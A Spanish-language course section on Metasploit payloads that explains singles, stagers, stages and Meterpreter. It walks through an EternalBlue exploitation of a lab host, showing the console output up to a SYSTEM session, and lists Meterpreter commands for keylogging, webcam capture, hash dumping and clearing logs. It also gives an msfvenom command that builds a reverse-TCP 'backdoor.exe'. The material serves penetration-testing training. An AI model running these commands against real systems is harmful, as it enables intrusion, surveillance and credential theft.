# Sección 5: Payloads en Metasploit

## 📋 Tabla de Contenidos

1. [¿Qué es un Payload?](#qué-es-un-payload)
2. [Tipos de Payloads](#tipos-de-payloads)
3. [Singles (Payloads Únicos)](#singles-payloads-únicos)
4. [Stagers (Cargadores)](#stagers-cargadores)
5. [Stages (Etapas)](#stages-etapas)
6. [Staged Payloads (Payloads por Etapas)](#staged-payloads-payloads-por-etapas)
7. [Meterpreter Payload](#meterpreter-payload)
8. [Buscar Payloads](#buscar-payloads)
9. [Seleccionar Payloads](#seleccionar-payloads)
10. [Usar Payloads](#usar-payloads)
11. [Tipos de Payloads Comunes](#tipos-de-payloads-comunes)

---

## 🎯 ¿Qué es un Payload?

### Definición

> Un **Payload** en Metasploit se refiere a un módulo que ayuda al módulo de exploit a (típicamente) devolver una shell al atacante.

### Función del Payload

Los payloads se envían **junto con el exploit** para:

1. **Bypasear** procedimientos de funcionamiento estándar del servicio vulnerable (trabajo del exploit)
2. **Ejecutarse** en el sistema operativo objetivo
3. **Retornar** una conexión reversa al atacante
4. **Establecer** un punto de apoyo (foothold) en el sistema

---

## 🧩 Analogía: Exploit vs Payload

```
┌─────────────────────────────────────────┐
│        PROCESO DE EXPLOTACIÓN           │
└─────────────────────────────────────────┘

EXPLOIT:
┌──────────────┐
│   🔓 Llave   │  = Abre la puerta (vulnerabilidad)
└──────────────┘

PAYLOAD:
┌──────────────┐
│  👤 Espía    │  = Entra y establece comunicación
└──────────────┘

RESULTADO:
┌──────────────┐
│  📞 Teléfono │  = Canal de comunicación establecido
└──────────────┘
```

**En términos simples**:
- **Exploit** = La herramienta que rompe la cerradura
- **Payload** = Lo que haces UNA VEZ que entraste

---

## 🔢 Tipos de Payloads

Existen **tres tipos diferentes** de módulos de payload en Metasploit Framework:

### Tipos Principales

| Tipo | Nombre | Descripción Breve |
|------|--------|-------------------|
| 1 | **Singles** | Todo-en-uno |
| 2 | **Stagers** | Cargador inicial pequeño |
| 3 | **Stages** | Payload completo descargado después |

### Identificación en el Nombre

El uso de **tres tipologías** de interacción de payload resultará beneficioso para el pentester, ofreciendo la **flexibilidad** necesaria para realizar ciertos tipos de tareas.

**Indicador clave**: El uso de `/` (barra) en el nombre del payload indica si es staged o no.

#### Ejemplos de Nomenclatura:

```bash
# SINGLE (sin stage)
windows/shell_bind_tcp
       └─ NO tiene "/" adicional = Single payload

# STAGED (con stage)
windows/shell/bind_tcp
       └─ "/" adicional = Stager + Stage
             ↑
         Separador
```

---

## 🎯 Singles (Payloads Únicos)

### ¿Qué es un Single Payload?

Un **Single payload** contiene el exploit y **todo el shellcode** para la tarea seleccionada en un solo paquete.

### Características

**Ventajas**:
- ✅ **Todo-en-uno**: Contienen todo en un solo paquete
- ✅ **Más estables** que sus contrapartes
- ✅ **Resultado inmediato**: No requieren comunicación adicional
- ✅ **Simplicidad**: Un solo objeto enviado y ejecutado

**Desventajas**:
- ❌ **Tamaño grande**: Pueden ser muy grandes
- ❌ **Compatibilidad limitada**: Algunos exploits no soportan payloads grandes
- ❌ **Detección más fácil**: Más datos = más fácil de detectar por IDS/IPS

### Analogía del Single Payload

```
SINGLE PAYLOAD = Mochila completa

┌─────────────────────┐
│   🎒 MOCHILA        │
│                     │
│  🔧 Herramientas    │
│  📱 Comunicación    │
│  🍕 Provisiones     │
│  🗺️ Mapa           │
│                     │
│  TODO EN UNO        │
└─────────────────────┘
```

**Ventaja**: Tienes todo lo que necesitas de inmediato
**Desventaja**: La mochila es grande y pesada

### Ejemplos de Uso

Un Single payload puede ser tan simple como:
- Agregar un usuario al sistema objetivo
- Iniciar un proceso específico
- Ejecutar un comando único

---

## 🚀 Stagers (Cargadores)

### ¿Qué es un Stager?

Un **Stager** es la primera parte de un payload staged. Es un pequeño código que:

1. Se ejecuta en la máquina víctima
2. Inicia una conexión saliente al atacante
3. Configura el canal de comunicación
4. Descarga el Stage payload subsecuente

### Características

**Diseño**:
- ✅ **Pequeños**: Típicamente 100-300 bytes
- ✅ **Confiables**: Diseñados para no fallar
- ✅ **Automáticos**: Metasploit selecciona el más apropiado

**Función principal**:
> Establecer un canal de comunicación estable entre atacante y víctima

### Stagers para Windows: NX vs NO-NX

#### Contexto Histórico

**DEP (Data Execution Prevention)** y **NX (No-eXecute)** son protecciones de memoria.

**Diferencias en Stagers**:

| Característica | NX Stagers | NO-NX Stagers |
|----------------|------------|---------------|
| **Tamaño** | Más grandes | Más pequeños |
| **Método** | VirtualAlloc memory | Directo al stack |
| **Compatibilidad** | Windows 7+ | Windows XP y anteriores |
| **Confiabilidad** | Menor en CPUs NX viejos | Mayor en sistemas antiguos |

**Default actual**: 
```
NX + Windows 7 compatible
```

### Stagers Comunes

```bash
# Reverse TCP (más común)
reverse_tcp       # Conexión TCP reversa

# Reverse HTTPS (más sigiloso)
reverse_https     # Conexión HTTPS reversa

# Bind TCP
bind_tcp          # Espera conexión en el objetivo
```

---

## 📦 Stages (Etapas)

### ¿Qué es un Stage?

Un **Stage** es el componente de payload que es **descargado** por el módulo Stager.

### Características

**Capacidades**:
- ✅ **Sin límites de tamaño**: Pueden ser muy grandes
- ✅ **Funcionalidades avanzadas**: Meterpreter, VNC Injection, etc.
- ✅ **Middle Stagers automáticos**: Para payloads grandes

### Middle Stagers

Los Stages usan automáticamente **middle stagers** (stagers intermedios):

#### ¿Por qué?

```
PROBLEMA:
┌───────────────────────────────────┐
│  Payload Stage muy grande         │
│  Un solo recv() falla              │
│  ❌ No cabe en un solo paquete    │
└───────────────────────────────────┘

SOLUCIÓN:
┌───────────────────────────────────┐
│  1. Stager recibe middle stager   │
│  2. Middle stager hace descarga   │
│     completa del Stage            │
│  ✅ Payload grande descargado OK  │
└───────────────────────────────────┘
```

#### Ventajas Adicionales

- Mejor para **RWX** (Read-Write-Execute) en memoria
- Manejo de payloads de múltiples megabytes
- Descarga en bloques para evitar timeouts

### Ejemplos de Stages

```bash
# Meterpreter (el más poderoso)
meterpreter

# Shell estándar
shell

# VNC Injection (control remoto visual)
vncinject

# PowerShell interactivo
powershell
```

---

## 🔗 Staged Payloads (Payloads por Etapas)

### Definición Completa

> Un **staged payload** es un proceso de explotación que está **modularizado** y **funcionalmente separado** para ayudar a segregar las diferentes funciones en diferentes bloques de código, cada uno completando su objetivo individualmente pero trabajando en encadenar el ataque.

### Objetivo del Diseño Staged

1. **Modularidad**: Separar funciones en bloques
2. **Compacidad**: Ser lo más compacto posible
3. **Evasión**: Evadir Antivirus (AV) / Intrusion Prevention System (IPS)
4. **Acceso remoto**: Otorgar acceso remoto si todas las etapas funcionan

### Flujo de un Staged Payload

```
ETAPA 0 (Stage0) - STAGER:
┌────────────────────────────────────┐
│  Shellcode inicial pequeño         │
│  Enviado sobre la red              │
│  Propósito: Inicializar conexión   │
│           reversa al atacante      │
└────────────────────────────────────┘
           ↓
      CONEXIÓN ESTABLECIDA
           ↓
ETAPA 1 (Stage1) - STAGE:
┌────────────────────────────────────┐
│  Payload grande descargado         │
│  Funcionalidad completa            │
│  Propósito: Shell access           │
└────────────────────────────────────┘
```

### Stage0 en Detalle

**Función del Stage0**:
- Inicializar conexión reversa al atacante
- Establecer canal de comunicación estable
- Leer payload Stage1 en memoria cuando llega

**Nombres comunes en Metasploit**:
```bash
reverse_tcp      # TCP reverso
reverse_https    # HTTPS reverso (más sigiloso)
bind_tcp         # Bind TCP (espera conexión)
```

### Ejemplo: show payloads

```bash
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp            normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid       normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4             normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid            normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https            normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe       normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4          normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid         normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>
```

### ¿Por Qué Reverse Connections Son Más Efectivas?

**Razón principal**: Aprovechan las reglas de tráfico saliente.

```
FIREWALL TÍPICO:

Tráfico ENTRANTE:
┌──────────────────┐
│  Internet        │
│       ↓          │  ❌ BLOQUEADO
│  Firewall        │     (Reglas estrictas)
│       ↓          │
│  Red Interna     │
└──────────────────┘

Tráfico SALIENTE:
┌──────────────────┐
│  Red Interna     │
│       ↓          │  ✅ PERMITIDO
│  Firewall        │     (Confianza en saliente)
│       ↓          │
│  Internet        │
└──────────────────┘
```

**Ventaja del Reverse**:
- La víctima **inicia** la conexión (saliente)
- Bypasea filtrado entrante estricto
- Aprovecha la confianza en tráfico saliente
- Reside en la "zona de confianza de seguridad"

**⚠️ Advertencia**:
> Esta política de confianza NO es seguida ciegamente por dispositivos de seguridad y personal de red, así que el atacante debe actuar con cuidado incluso en este paso.

---

## 🎭 Meterpreter Payload

### ¿Qué es Meterpreter?

> **Meterpreter** es un payload específico de tipo **multi-facético** que usa **inyección de DLL** para asegurar que la conexión al host víctima sea estable, difícil de detectar y persistente.

### Características Especiales

#### 1. Reside en Memoria (Fileless)

```
DISCO DURO:
┌──────────────┐
│              │  ← Meterpreter NO está aquí
│  Sin archivos│
│  Sin huellas │
└──────────────┘

MEMORIA RAM:
┌──────────────┐
│  Meterpreter │  ← Meterpreter vive aquí
│  Ejecutándose│
│  Invisible   │
└──────────────┘
```

**Ventajas**:
- ✅ No deja huellas en disco duro
- ✅ Muy difícil de detectar con técnicas forenses convencionales
- ✅ No aparece en listados de archivos

#### 2. Inyección de DLL

**Método**: Se inyecta en procesos legítimos de Windows

```
PROCESO LEGÍTIMO (explorer.exe):
┌───────────────────────┐
│  explorer.exe         │
│  (Proceso de Windows) │
│                       │
│  [Meterpreter DLL]   │ ← Inyectado aquí
│                       │
│  ✅ Parece normal     │
└───────────────────────┘
```

#### 3. Persistencia

**Sobrevive a**:
- Reinicios del sistema (si está configurado)
- Cambios del sistema
- Cierre de programas

#### 4. Carga Dinámica de Scripts y Plugins

```bash
# Cargar extensiones
meterpreter > load kiwi
meterpreter > load powershell
meterpreter > load python

# Descargar cuando no se necesitan
meterpreter > run <script>
```

### Funcionalidades de Meterpreter

**Capacidades incluyen**:
- 🎹 Captura de pulsaciones de teclado (keystroke capture)
- 🔐 Recolección de hashes de contraseñas
- 🎤 Grabación de micrófono
- 📸 Capturas de pantalla
- 🎭 Suplantación de tokens de seguridad de procesos
- 📁 Navegación de archivos
- 🌐 Pivoting y tunneling
- Y mucho más...

### Interfaz Meterpreter

Una vez ejecutado, se crea una **nueva sesión** que genera la interfaz de Meterpreter:

```
SIMILITUD:
msfconsole ≈ Meterpreter

DIFERENCIA:
msfconsole  → Controla Metasploit
Meterpreter → Controla sistema objetivo
```

**Todos los comandos disponibles** están dirigidos al sistema objetivo que el payload ha "infectado".

---

## 🔍 Buscar Payloads

### ¿Qué Queremos Hacer?

Antes de seleccionar un payload, necesitamos saber **qué queremos hacer** en la máquina objetivo.

**Ejemplo de decisión**:
```
¿Objetivo?
  → Persistencia de acceso
     → Seleccionar Meterpreter payload

¿Objetivo?
  → Ejecución rápida de comando
     → Seleccionar Shell simple
```

### Comando Básico: show payloads

```bash
msf6 > show payloads

Payloads
========

   #    Name                                    Disclosure Date  Rank    Check  Description
   -    ----                                    ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                   manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                  manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                   manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                         manual  No     Android Meterpreter, Android Reverse HTTP Stager
   ...
   534  windows/x64/meterpreter_reverse_tcp                      manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64
   ...
   561  windows/x64/vncinject/reverse_winhttps                   manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

**Problema**: ¡Hay cientos de payloads!

---

## 🔎 Filtrar Payloads con grep

### Uso Básico de grep

**Sintaxis**:
```bash
grep <término_búsqueda> <comando>
```

### Ejemplo 1: Buscar Meterpreter

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   ...
   19  payload/windows/x64/meterpreter/reverse_winhttps     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
```

### Contar Resultados

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```

**Resultado**: 14 payloads de Meterpreter encontrados.

### Ejemplo 2: Doble Filtro (grep encadenado)

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

**Resultado**: Solo 3 payloads que son **Meterpreter** Y **reverse_tcp**.

### Ventaja de grep

```
ANTES:
561 payloads totales

DESPUÉS DE FILTRAR:
3 payloads relevantes

✅ Búsqueda 186x más rápida
```

---

## ⚙️ Seleccionar Payloads

### Método de Selección

Al igual que con los módulos, necesitamos el **número de índice** del payload.

**Comando**:
```bash
set payload <número>
```

**⚠️ Importante**: Solo después de seleccionar un módulo de Exploit primero.

### Ejemplo Completo: Selección de Payload

#### Paso 1: Ver Opciones del Exploit

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

#### Paso 2: Buscar Payload Deseado

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

#### Paso 3: Seleccionar Payload

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

#### Paso 4: Verificar Nuevas Opciones

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain
   SMBPass                         no        (Optional) The password
   SMBUser                         no        (Optional) The username
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target

Payload options (windows/x64/meterpreter/reverse_tcp):  ← NUEVA SECCIÓN

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

**Observación importante**:
> Al ejecutar `show payloads` dentro del módulo Exploit, msfconsole detectó que el objetivo es Windows y **solo mostró payloads dirigidos a Windows**.

---

## 🚀 Usar Payloads

### Parámetros a Configurar

#### Para el Exploit:

| Parámetro | Descripción |
|-----------|-------------|
| **RHOSTS** | Dirección IP del host remoto, la máquina objetivo |
| **RPORT** | No requiere cambio, solo verificar que estamos en el puerto correcto (445 para SMB) |

#### Para el Payload:

| Parámetro | Descripción |
|-----------|-------------|
| **LHOST** | Dirección IP del host del atacante (tu máquina) |
| **LPORT** | No requiere cambio, solo verificar que el puerto no esté en uso (default 4444) |

### Verificar IP del Atacante (LHOST)

**Truco**: Ejecutar `ifconfig` directamente desde msfconsole

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > ifconfig

[*] exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>
```

### Configurar Parámetros

```bash
# Configurar LHOST (tu IP)
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
LHOST => 10.10.14.15

# Configurar RHOSTS (IP del objetivo)
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```

### Ejecutar el Exploit

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40  ← STAGE siendo enviado
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >  ← SESIÓN METERPRETER ACTIVA
```

### Verificar Acceso

```bash
meterpreter > whoami

[-] Unknown command: whoami.  ← whoami no funciona en Meterpreter

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM  ← ¡Acceso SYSTEM obtenido!
```

**Observación**:
> El prompt NO es una línea de comandos de Windows sino un **prompt de Meterpreter**. El comando `whoami` (típico de Windows) no funciona aquí. En su lugar, usamos el equivalente de Linux: `getuid`.

---

## 🎮 Comandos de Meterpreter

### Ver Menú de Ayuda

```bash
meterpreter > help
```

### Categorías de Comandos

#### 1. Core Commands (Comandos Principales)

```bash
?                         Help menu
background / bg           Poner sesión en segundo plano
exit / quit               Terminar sesión de Meterpreter
sessions                  Cambiar rápidamente a otra sesión
migrate                   Migrar a otro proceso
load                      Cargar extensiones de Meterpreter
run                       Ejecutar script o módulo Post
```

#### 2. File System Commands (Sistema de Archivos)

```bash
cat           Leer contenido de archivo
cd            Cambiar directorio
download      Descargar archivo o directorio
upload        Subir archivo o directorio
ls            Listar archivos
pwd           Mostrar directorio actual
search        Buscar archivos
rm            Eliminar archivo
```

**Ejemplo de navegación**:

```bash
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris
```

#### 3. Networking Commands (Comandos de Red)

```bash
arp           Mostrar caché ARP del host
ifconfig      Mostrar interfaces de red
netstat       Mostrar conexiones de red
portfwd       Reenviar puerto local a servicio remoto
route         Ver y modificar tabla de ruteo
```

#### 4. System Commands (Comandos de Sistema)

```bash
clearev       Limpiar log de eventos
execute       Ejecutar un comando
getpid        Obtener identificador de proceso actual
getprivs      Intentar habilitar todos los privilegios
getuid        Obtener usuario del servidor
kill          Terminar un proceso
ps            Listar procesos en ejecución
shell         Abrir shell de comandos del sistema
sysinfo       Obtener información del sistema remoto
```

#### 5. User Interface Commands (Comandos de Interfaz)

```bash
screenshot    Capturar pantalla del escritorio
screenshare   Ver escritorio del usuario en tiempo real
keyscan_start Iniciar captura de pulsaciones de teclado
keyscan_dump  Volcar buffer de pulsaciones capturadas
keyscan_stop  Detener captura de pulsaciones
```

#### 6. Webcam Commands (Comandos de Webcam)

```bash
record_mic     Grabar audio del micrófono por X segundos
webcam_list    Listar webcams
webcam_snap    Tomar foto de webcam especificada
webcam_stream  Reproducir stream de video de webcam
```

#### 7. Privilege Escalation Commands

```bash
getsystem     Intentar elevar privilegio a SYSTEM local
```

#### 8. Password Database Commands

```bash
hashdump      Volcar contenido de base de datos SAM
```

**Capacidades impresionantes**:
- ✅ Extraer hashes de usuarios de SAM
- ✅ Tomar capturas de pantalla
- ✅ Activar webcams
- ✅ Grabar audio
- ✅ Keylogging
- ✅ Y mucho más...

**Todo desde una interfaz de línea de comandos estilo Linux.**

---

## 🖥️ Abrir Shell de Windows desde Meterpreter

### Comando shell

```bash
meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

**Explicación**:
- **Channel 1**: Representa la conexión entre tu máquina y el host objetivo
- Establecida como conexión TCP reversa (del host objetivo hacia ti)
- Usa Meterpreter Stager y Stage

### Usar CMD de Windows

```bash
C:\Users> dir

 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users> whoami
nt authority\system
```

**Ahora sí funciona `whoami`** porque estamos en la shell de Windows real.

### ¿Cuándo Usar Shell vs Meterpreter?

| Situación | Usar |
|-----------|------|
| Necesitas comandos nativos de Windows | Shell (cmd) |
| Necesitas funciones avanzadas de post-explotación | Meterpreter |
| Necesitas navegar archivos rápido | Meterpreter (más rápido) |
| Necesitas ejecutar .exe o scripts | Shell |
| Necesitas persistencia y evasión | Meterpreter |

---

## 📋 Tipos de Payloads Comunes para Windows

### Tabla de Referencia Rápida

| Payload | Descripción |
|---------|-------------|
| `generic/custom` | Listener genérico, multi-uso |
| `generic/shell_bind_tcp` | Listener genérico, shell normal, binding TCP |
| `generic/shell_reverse_tcp` | Listener genérico, shell normal, reverse TCP |
| `windows/x64/exec` | Ejecuta comando arbitrario (Windows x64) |
| `windows/x64/loadlibrary` | Carga biblioteca x64 arbitraria |
| `windows/x64/messagebox` | Muestra diálogo con MessageBox personalizable |
| `windows/x64/shell_reverse_tcp` | Shell normal, single payload, reverse TCP |
| `windows/x64/shell/reverse_tcp` | Shell normal, stager + stage, reverse TCP |
| `windows/x64/shell/bind_ipv6_tcp` | Shell normal, stager + stage, IPv6 Bind TCP |
| `windows/x64/meterpreter/$` | Payload Meterpreter + variedades |
| `windows/x64/powershell/$` | Sesiones PowerShell interactivas + variedades |
| `windows/x64/vncinject/$` | Servidor VNC (Inyección Reflectiva) + variedades |

**Nota**: El símbolo `$` indica que existen múltiples variantes (reverse_tcp, reverse_https, bind_tcp, etc.)

---

## 🎯 Payloads Avanzados (Fuera del Alcance)

### Empire y Cobalt Strike

**Empire**:
- Framework de post-explotación
- Agentes PowerShell
- C2 (Command and Control) avanzado

**Cobalt Strike**:
- Herramienta comercial de pentesting
- Beacons (agentes)
- Simulación de adversarios
- C2 profesional

> Estos payloads son **muy utilizados** por pentesters profesionales en evaluaciones de seguridad de objetivos de alto valor.

**No están en el alcance de este curso**, pero se recomienda investigarlos en tiempo libre para obtener conocimiento sobre cómo los pentesters profesionales realizan sus evaluaciones.

---

## 🔧 Otros Payloads Especializados

### Por Fabricante de Dispositivo

**Ejemplos**:
- Cisco (routers, switches)
- Apple (macOS, iOS)
- PLCs (Controladores Lógicos Programables)
- Android
- Linux embebido

### Generación Personalizada

**msfvenom**: Herramienta para generar payloads personalizados

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe > backdoor.exe
```

**Profundizaremos en msfvenom en secciones posteriores.**

---

## 📊 Tabla Comparativa: Singles vs Staged

| Característica | Singles | Staged |
|----------------|---------|--------|
| **Tamaño** | Grande (todo incluido) | Pequeño inicial, grande después |
| **Estabilidad** | Más estable | Depende de conexión estable |
| **Compatibilidad** | Limitada (algunos exploits no soportan) | Alta (exploits prefieren pequeños) |
| **Detección** | Más fácil de detectar | Más difícil de detectar |
| **Velocidad** | Más rápido (un solo envío) | Más lento (dos etapas) |
| **Evasión AV/IPS** | Menor | Mayor |
| **Nomenclatura** | `windows/shell_bind_tcp` | `windows/shell/bind_tcp` |

---

## 🎓 Decisión: ¿Qué Payload Usar?

### Flujo de Decisión

```
¿Necesitas PERSISTENCIA y FUNCIONES AVANZADAS?
   ↓
  SÍ → Meterpreter (staged)
   ↓
  NO → ¿Necesitas EVASIÓN de AV/IPS?
          ↓
         SÍ → Staged payload
          ↓
         NO → ¿El exploit soporta payloads grandes?
                ↓
               SÍ → Single payload (más simple)
                ↓
               NO → Staged payload (necesario)
```

### Recomendaciones por Escenario

**Pentesting profesional**:
- ✅ Meterpreter (máxima funcionalidad)
- ✅ Staged (evasión)

